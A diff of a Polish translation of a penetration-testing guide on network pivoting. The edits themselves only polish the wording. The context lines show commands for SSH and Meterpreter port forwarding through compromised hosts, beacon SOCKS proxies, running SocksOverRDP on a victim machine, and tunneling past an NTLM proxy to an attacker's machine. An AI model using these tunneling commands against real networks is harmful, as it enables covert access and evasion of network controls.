@@ -43,7 +43,7 @@ ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in
 ```
 ### Port2Port
 
-Lokalny port --> Skompromitowany host (SSH) --> Trzecia_puszka:Port
+Lokalny port --> Skompromitowany host (SSH) --> Trzecia_boks:Port
 ```bash
 ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
 #Example
@@ -89,8 +89,8 @@ route add -net 10.0.0.0/16 gw 1.1.1.1
 ```
 ## SSHUTTLE
 
-Możesz **tunnel** przez **ssh** cały **traffic** do **subnetwork** przez hosta.\
-Na przykład, przekierowując cały traffic kierujący się do 10.10.10.0/24
+Możesz **tunnel** przez **ssh** cały **ruch** do **podsieci** przez hosta.\
+Na przykład, przekierowując cały ruch kierujący się do 10.10.10.0/24
 ```bash
 pip install sshuttle
 sshuttle -r user@host 10.10.10.10/24
@@ -104,7 +104,7 @@ sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
 
 ### Port2Port
 
-Lokalny port --> Skompromitowany host (aktywna sesja) --> Trzecia_boks:Port
+Lokalny port --> Skompromitowany host (aktywna sesja) --> Trzecia_puszka:Port
 ```bash
 # Inside a meterpreter session
 portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
@@ -134,7 +134,7 @@ echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
 
 ### SOCKS proxy
 
-Otwórz port w serwerze zespołu nasłuchujący na wszystkich interfejsach, który może być użyty do **przekierowywania ruchu przez beacon**.
+Otwórz port w serwerze zespołu nasłuchujący na wszystkich interfejsach, który może być używany do **przekierowywania ruchu przez beacon**.
 ```bash
 beacon> socks 1080
 [+] started SOCKS4a server on: 1080
@@ -150,7 +150,7 @@ proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
 rportfwd [bind port] [forward host] [forward port]
 rportfwd stop [bind port]
 ```
-Aby zauważyć:
+Do zauważenia:
 
 - Odwrócone przekierowanie portów Beacona jest zaprojektowane do **tunnelingu ruchu do Serwera Zespołu, a nie do przekazywania między poszczególnymi maszynami**.
 - Ruch jest **tunnelowany w ramach ruchu C2 Beacona**, w tym linków P2P.
@@ -346,7 +346,7 @@ netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 Musisz mieć **dostęp RDP do systemu**.\
 Pobierz:
 
-1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - To narzędzie wykorzystuje `Dynamic Virtual Channels` (`DVC`) z funkcji Zdalnego Pulpitu w systemie Windows. DVC jest odpowiedzialne za **tunneling pakietów przez połączenie RDP**.
+1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - To narzędzie wykorzystuje `Dynamic Virtual Channels` (`DVC`) z funkcji Zdalnego Pulpitu w systemie Windows. DVC odpowiada za **tunneling pakietów przez połączenie RDP**.
 2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)
 
 Na swoim komputerze klienckim załaduj **`SocksOverRDP-Plugin.dll`** w ten sposób:
@@ -354,9 +354,9 @@ Na swoim komputerze klienckim załaduj **`SocksOverRDP-Plugin.dll`** w ten spos�
 # Load SocksOverRDP.dll using regsvr32.exe
 C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
 ```
-Teraz możemy **połączyć** się z **ofiarą** za pomocą **RDP** używając **`mstsc.exe`**, i powinniśmy otrzymać **komunikat** informujący, że **wtyczka SocksOverRDP jest włączona**, i będzie **nasłuchiwać** na **127.0.0.1:1080**.
+Teraz możemy **połączyć** się z **ofiarą** za pomocą **RDP** używając **`mstsc.exe`**, i powinniśmy otrzymać **komunikat** informujący, że **plugin SocksOverRDP jest włączony**, i będzie **nasłuchiwać** na **127.0.0.1:1080**.
 
-**Połącz** się przez **RDP** i prześlij oraz uruchom na maszynie ofiary plik binarny `SocksOverRDP-Server.exe`:
+**Połącz** się przez **RDP** i prześlij oraz uruchom na maszynie ofiary binarkę `SocksOverRDP-Server.exe`:
 ```
 C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
 ```
@@ -369,8 +369,8 @@ Teraz możesz użyć [**Proxifier**](https://www.proxifier.com/) **do proxyfikac
 ## Proxyfikacja aplikacji GUI w Windows
 
 Możesz sprawić, że aplikacje GUI w Windows będą korzystać z proxy za pomocą [**Proxifier**](https://www.proxifier.com/).\
-W **Profile -> Proxy Servers** dodaj IP i port serwera SOCKS.\
-W **Profile -> Proxification Rules** dodaj nazwę programu do proxyfikacji oraz połączenia do IP, które chcesz proxyfikować.
+W **Profile -> Proxy Servers** dodaj adres IP i port serwera SOCKS.\
+W **Profile -> Proxification Rules** dodaj nazwę programu do proxyfikacji oraz połączenia do adresów IP, które chcesz proxyfikować.
 
 ## Ominięcie proxy NTLM
 
@@ -392,7 +392,7 @@ Domain CONTOSO.COM
 Proxy 10.0.0.10:8080
 Tunnel 2222:<attackers_machine>:443
 ```
-Teraz, jeśli na przykład ustawisz na ofierze usługę **SSH** do nasłuchiwania na porcie 443. Możesz się z nią połączyć przez port atakującego 2222.\
+Teraz, jeśli ustawisz na przykład w ofierze usługę **SSH** do nasłuchiwania na porcie 443. Możesz się z nią połączyć przez port atakującego 2222.\
 Możesz również użyć **meterpreter**, który łączy się z localhost:443, a atakujący nasłuchuje na porcie 2222.
 
 ## YARP
@@ -480,7 +480,7 @@ ssh -D 9050 -p 2222 -l user 127.0.0.1
 ## ngrok
 
 [**ngrok**](https://ngrok.com/) **to narzędzie do eksponowania rozwiązań w Internecie w jednej linii poleceń.**\
-_&#x45;xposition URI są jak:_ **UID.ngrok.io**
+_Adresy URI ekspozycji są jak:_ **UID.ngrok.io**
 
 ### Instalacja
 
@@ -525,7 +525,7 @@ Bezpośrednio z stdout lub w interfejsie HTTP [http://127.0.0.1:4040](http://127
 ```
 #### ngrok.yaml prosty przykład konfiguracji
 
-Otwiera 3 tunel:
+Otwiera 3 tunele:
 
 - 2 TCP
 - 1 HTTP z ekspozycją statycznych plików z /tmp/httpbin/
